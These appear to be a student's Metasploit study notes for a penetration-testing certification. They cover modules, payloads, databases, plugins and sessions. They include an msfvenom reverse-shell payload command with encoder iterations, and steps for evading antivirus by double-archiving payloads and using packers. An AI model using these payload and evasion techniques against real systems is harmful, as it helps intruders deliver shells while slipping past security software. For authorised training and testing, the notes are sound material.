## Components
### Modules
Modules are divided in multiple categories:

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|


### Targets

For each exploit there could be more target in the options
To show targets, we can use the msfconsole options when we've selected an exploit:
`show targets`

### Payloads

We have already talked about stageless and staged payload. The first sends the full payload in a single request, the latter sends first the stager and then the stager (which only reconnects back to the metasploit client) full downloads the stage, that is the actually payload.
We can search for a specific payload:
`grep meterpreter grep reverse_tcp show payloads`
The syntax is a bit odd but with this we are searching for meterpreter reverse tcp payload.

### Encoders
`show encoders` to list all the encoders.
One famous is `Shikata Ga Nai (SGN)`
To encode with msfvenom, we can specify the `-e` option:
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Encoding is not enought for AV bypass, what we can do is increase the iterations with `-i 10`. This will iterate the process 10 times.

### Databases
Msfconsole utilizes the postgresql to store information about scans, loot, credentials, services, ecc...
To make all work, these are the following steps (first of all update with apt to make it work):

PostgreSQL Status

```shell-session
Poiint@htb[/htb]$ sudo service postgresql status
```

Start PostgreSQL

```shell-session
Poiint@htb[/htb]$ sudo systemctl start postgresql
```

MSF - Initiate a Database

```shell-session
Poiint@htb[/htb]$ sudo msfdb init
```

```shell-session
Poiint@htb[/htb]$ sudo msfdb status
```


MSF - Reinitiate the Database (Only if problems arise)

```shell-session
Poiint@htb[/htb]$ msfdb reinit
Poiint@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
Poiint@htb[/htb]$ sudo service postgresql restart
Poiint@htb[/htb]$ msfconsole -q
```

Now it should be working, we can add workspaces (they are like folders but for metasploit).

Workspaces

```shell-session
msf6 > workspace

* default
```

Add workspaces

```shell-session
msf6 > workspace -a Target_1
```

Now we can import scan from nmap (XML files are preferred) or we can directly use the `db_nmap` options.
If we are finished with can export our workspace:
`db_export -f xml backup.xml`.
This feature is cool because while we continue with our assessment, we can type `hosts, services, creds, loot, ecc` and metasploit will give us these information organized.

### Plugins
Plugins are third party software integrated with the metasploit framework (like nessus).
Plugins are on `usr/share/metasploit-framework/plugins/`
To load a plugin, we can type:
`load nessus`.
To install new plugins, we can check some online ones:
Downloading MSF Plugins

```shell-session
Poiint@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
Poiint@htb[/htb]$ ls Metasploit-Plugins
```

If we are interested in someone (like pentest.rb) we can add that file to the plugins folder (listed above).

## Sessions

While running available exploits or auxiliary modules, we can background a channel communication. To list the available sessions, we can type:
`sessions`
To interact
`session -i 1`
This will interact with session 1.

To better manage exploits ecc... we can run exploits as "jobs".
To do so, we can type `run/exploit` with `-j`:
`exploit -j` 
This will create a job, and we can simply kill it to restore the port utilized (CTRL + C doesn't work for that matter).

## Importing Modules 
It's possible that not every exploit is inside metasploit.
We have the possibility to add an exploit to it.
We can search exploits from [ExploitDB](https://www.exploit-db.com/) or locally with `searchsploit`.
We can search exploit with searchsploit like this:
`searchsploit -t exploit_name --exclude=".py"`
We can add the exploit in `/usr/share/metasploit-framework/exploits` or in our home folder (or root folder) in the symlinked (with the metasploit-framework folder) hidden folder `./msf4/` location.
For example:
```shell-session
Poiint@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

Poiint@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

MSF - Loading Additional Modules

```shell-session
msf6> loadpath /usr/share/metasploit-framework/modules/
```

```shell-session
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
```

I did not include the writing your own script part (i dont know ruby). It should not also be in scope of CPTS so to do in future.
## Local Exploit Suggester
As a tip, there is a module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions. Furthermore, running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.
## Firewall and IDS/IPS Evasion
Like we said encoding with iteration could be not enough to evade AV and other security software in place.
What we can do is archive the payload multiple times:
Archiving the Payload

```shell-session
Poiint@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
Poiint@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
Poiint@htb[/htb]$ rar a ~/test.rar -p ~/test.js
```

Then we remove the extension ".rar":
Removing the .RAR Extension

```shell-session
Poiint@htb[/htb]$ mv test.rar test
```

Then we re-iterate the process:

Archiving the Payload Again

```shell-session
Poiint@htb[/htb]$ rar a test2.rar -p test
```

Removing the .RAR Extension

```shell-session
Poiint@htb[/htb]$ mv test2.rar test2
```

Finally, our test2 file have been archived 2 times. If we try to analyze this payload with virustotal we can see that it's not triggered by most AVs.

Packers could also be used:
The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

Or, if we are trying to exploit a buffer (so buffer overflow):
When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an `Offset` switch inside the code for the msfconsole module:
```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
